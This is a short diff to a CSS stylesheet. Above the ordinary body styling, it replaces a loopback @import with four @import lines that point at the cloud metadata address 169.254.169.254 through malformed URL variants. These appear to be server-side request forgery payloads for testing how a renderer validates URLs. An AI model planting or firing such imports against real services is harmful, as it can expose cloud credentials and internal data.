@@ -1,5 +1,7 @@
-@import url("http://[::]:80/index.php");
-
+@import url("///169.254.169.254/latest/meta-data/");
+@import url("//169.254.169.254/latest/meta-data/");
+@import url("/\169.254.169.254/latest/meta-data/");
+@import url("http:///169.254.169.254/");
 /* Style the page background */
 body {
   font-family: Arial, sans-serif;
